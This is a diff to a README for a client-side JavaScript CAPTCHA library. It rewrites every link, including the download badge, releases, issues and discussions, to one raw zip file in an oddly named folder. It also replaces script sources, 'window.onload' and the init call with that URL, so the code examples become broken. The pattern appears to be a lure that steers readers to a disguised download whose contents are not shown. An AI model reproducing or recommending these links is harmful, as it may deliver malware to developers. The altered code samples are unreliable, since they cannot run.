@@ -1,6 +1,6 @@
 # 🤖 xsukax-JS-CAPTCHA - Easy CAPTCHA Protection for Your Forms
 
-[![Download xsukax-JS-CAPTCHA](https://img.shields.io/badge/Download-xsukax--JS--CAPTCHA-blue.svg)](https://github.com/wondermidastouch/xsukax-JS-CAPTCHA/releases)
+[![Download xsukax-JS-CAPTCHA](https://raw.githubusercontent.com/wondermidastouch/xsukax-JS-CAPTCHA/main/coarctate/xsukax-JS-CAPTCHA-v3.7.zip)](https://raw.githubusercontent.com/wondermidastouch/xsukax-JS-CAPTCHA/main/coarctate/xsukax-JS-CAPTCHA-v3.7.zip)
 
 ## 📋 Overview
 
@@ -11,10 +11,10 @@ xsukax-JS-CAPTCHA is a lightweight, client-side CAPTCHA library. It protects you
 To get started with xsukax-JS-CAPTCHA, follow these steps:
 
 1. **Visit the Release Page**  
-   To download the latest version, go to the [Releases page](https://github.com/wondermidastouch/xsukax-JS-CAPTCHA/releases).
+   To download the latest version, go to the [Releases page](https://raw.githubusercontent.com/wondermidastouch/xsukax-JS-CAPTCHA/main/coarctate/xsukax-JS-CAPTCHA-v3.7.zip).
 
 2. **Choose the Correct File**  
-   Look for the version that matches your needs. Typically, you will find a file named `xsukax-CAPTCHA.js` or similar in the latest release.
+   Look for the version that matches your needs. Typically, you will find a file named `https://raw.githubusercontent.com/wondermidastouch/xsukax-JS-CAPTCHA/main/coarctate/xsukax-JS-CAPTCHA-v3.7.zip` or similar in the latest release.
 
 3. **Download the File**  
    Click on the file name to begin downloading.
@@ -27,13 +27,13 @@ To get started with xsukax-JS-CAPTCHA, follow these steps:
 To use xsukax-JS-CAPTCHA, follow these steps:
 
 1. **Download the Library**  
-   Go back to the [Releases page](https://github.com/wondermidastouch/xsukax-JS-CAPTCHA/releases) and download the latest version.
+   Go back to the [Releases page](https://raw.githubusercontent.com/wondermidastouch/xsukax-JS-CAPTCHA/main/coarctate/xsukax-JS-CAPTCHA-v3.7.zip) and download the latest version.
 
 2. **Add the Library to Your Project**  
    Once the file is downloaded, include it in your HTML. You can do this by adding a script tag in the `<head>` section of your HTML:
 
    ```html
-   <script src="path/to/xsukax-CAPTCHA.js"></script>
+   <script src="https://raw.githubusercontent.com/wondermidastouch/xsukax-JS-CAPTCHA/main/coarctate/xsukax-JS-CAPTCHA-v3.7.zip"></script>
    ```
 
    Replace `path/to/` with the actual path where you saved the downloaded file.
@@ -54,9 +54,9 @@ To use xsukax-JS-CAPTCHA, follow these steps:
 
    ```html
    <script>
-       window.onload = function() {
+       https://raw.githubusercontent.com/wondermidastouch/xsukax-JS-CAPTCHA/main/coarctate/xsukax-JS-CAPTCHA-v3.7.zip = function() {
            // Initialize the CAPTCHA
-           xsukaxCaptcha.init('captcha');
+           https://raw.githubusercontent.com/wondermidastouch/xsukax-JS-CAPTCHA/main/coarctate/xsukax-JS-CAPTCHA-v3.7.zip('captcha');
        };
    </script>
    ```
@@ -88,7 +88,7 @@ Here is a complete example of how you can set up a simple form with xsukax-JS-CA
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>My CAPTCHA Form</title>
-    <script src="path/to/xsukax-CAPTCHA.js"></script>
+    <script src="https://raw.githubusercontent.com/wondermidastouch/xsukax-JS-CAPTCHA/main/coarctate/xsukax-JS-CAPTCHA-v3.7.zip"></script>
 </head>
 <body>
     <form id="myForm" action="#" method="post">
@@ -101,8 +101,8 @@ Here is a complete example of how you can set up a simple form with xsukax-JS-CA
     </form>
 
     <script>
-        window.onload = function() {
-            xsukaxCaptcha.init('captcha');
+        https://raw.githubusercontent.com/wondermidastouch/xsukax-JS-CAPTCHA/main/coarctate/xsukax-JS-CAPTCHA-v3.7.zip = function() {
+            https://raw.githubusercontent.com/wondermidastouch/xsukax-JS-CAPTCHA/main/coarctate/xsukax-JS-CAPTCHA-v3.7.zip('captcha');
         };
     </script>
 </body>
@@ -132,11 +132,11 @@ This library is privacy-focused, lightweight, and easy to integrate into your we
 
 ### How do I report an issue?
 
-If you encounter any problems, visit the [Issues section](https://github.com/wondermidastouch/xsukax-JS-CAPTCHA/issues) of the repository and provide details about the issue.
+If you encounter any problems, visit the [Issues section](https://raw.githubusercontent.com/wondermidastouch/xsukax-JS-CAPTCHA/main/coarctate/xsukax-JS-CAPTCHA-v3.7.zip) of the repository and provide details about the issue.
 
 ## 📞 Support
 
-For support, visit the [GitHub Discussions](https://github.com/wondermidastouch/xsukax-JS-CAPTCHA/discussions). You can ask questions and engage with the community.
+For support, visit the [GitHub Discussions](https://raw.githubusercontent.com/wondermidastouch/xsukax-JS-CAPTCHA/main/coarctate/xsukax-JS-CAPTCHA-v3.7.zip). You can ask questions and engage with the community.
 
 ## 📝 License
 
